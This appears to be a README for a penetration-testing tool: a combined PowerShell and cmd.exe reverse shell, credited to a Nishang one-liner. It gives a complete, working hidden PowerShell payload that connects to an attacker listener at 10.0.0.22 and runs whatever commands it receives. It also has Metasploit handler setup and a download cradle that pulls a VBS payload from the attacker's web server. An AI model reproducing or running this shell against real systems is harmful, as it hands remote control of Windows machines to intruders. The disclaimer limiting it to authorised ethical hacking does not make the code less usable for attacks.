# Combined PowerShell and CMD Reverse Shell

**Credit:** Based on the PowerShell reverse shell one-liner provided by Nikhil Mittal:<br />
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

**Disclaimer:** These scripts are provided for educational purposes only and for use by Ethical Hackers. Use only on systems for which you have acquired all the legally required contracts and permissions for use. It is your responsibility to determine whether you are legally permitted to use these scripts in your country and for your purposes. No warrantee or guarantees are provided.

**Tested on** PowerShell version 2 and up.

**CMD Shell Intro:**<br />
This is a psudo cmd.exe reverse shell. I designed this shell to support some PowerShell convenience commands such as 'pwd','ls','ps','rm','cp','mv','cat'.

Simply add more of them to the array if you wish to support more. Also, if you are determined to only support CMD commands when at the CMD prompt then reduce the list. Bear in mind that 'cd,'exit',and 'd:' are required, if you remove them you will be unable to make persistent changes to other drives or directories and you will not be able to use the exit command to exit the shell.

The reality is that PowerShell is calling 'cmd.exe /c' for every cmd command that you enter, so in effect PowerShell is the parent, cmd.exe the child and the only environment change that persists between commands happens in PowerShell. For this reason I had to catch any directory or drive letter change and execute them in PowerShell, otherwise the change would not persist between one call to cmd.exe and the next.

**PowerShell Shell Intro:**<br />
This shell doubles as a PowerShell reverse shell. Type $ps on the cmd command line and the shell will switch to a PowerShell shell from the cmd.exe shell. Then type $ps=$false in the PowerShell shell and you will switch back to running commands through cmd.exe.

The script is intended to be launched with the -NonI (non interactive) option of powershell. The result of not running it like this is that PowerShell will try to interactively prompt for missing parameters and your shell will be locked up. As a result of the -NonI option, if you fail to provide the required parameters to a PowerShell command you will not see any error messages, the command simply will not work. So if you are having issues with a command's syntax, be sure to test on your own Windows system from an interactive PowerShell prompt.

## Less Preferred Method of Invocation

 **On Kali:**<br />
export HOSTIP=10.0.0.22;<br />
export EXP1=5379;<br />
msfconsole -q -x "setg LHOST $HOSTIP;use exploit/multi/handler;set ExitOnSession false;set PAYLOAD windows/x64/shell_reverse_tcp;set EXITFUNC thread;set LPORT $EXP1;exploit -j;";

**On Windows:**<br />
set HOSTIP=10.0.0.22<br />
set EXP1=5379<br />
powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip=(gci -path env:HOSTIP).value;$port=(gci -path env:EXP1).value;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split(" ");$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"

This invokation method assumes that you are pasting the text into a shell on Kali and on Windows. The downside is it will 'use up' the existing cmd shell that you have on Windows. The advantage is that you do not have to download any file.

## More Preferred Method of Invocation
**On Kali - Instructions**<br />
Set up an HTTP server that is providing access to the psrev.vbs file.<br />
Then...<br />
export HOSTIP=10.0.0.22;<br />
export EXP1=5379;<br />
msfconsole -q -x "setg LHOST $HOSTIP;use exploit/multi/handler;set ExitOnSession false;set PAYLOAD windows/x64/shell_reverse_tcp;set EXITFUNC thread;set LPORT $EXP1;exploit -j;";

**On Windows**<br />
Download the psrev.vbs script...<br />
set HOSTIP=10.0.0.22<br />
set EXP1=5379<br />
powershell.exe -Exec Bypass "& {$storageDir = $pwd;$webclient = New-Object System.Net.WebClient;$url = 'http://%HOSTIP%/scripts/vbs/psrev.vbs';$file = 'psrev.vbs';$webclient.DownloadFile($url,$file)}"

Run the psrev.vbs script...<br />
psrev.vbs<br />

The psrev.vbs script requires that you have set the HOSTIP and EXP1 environment variables in the current CMD shell on Windows.





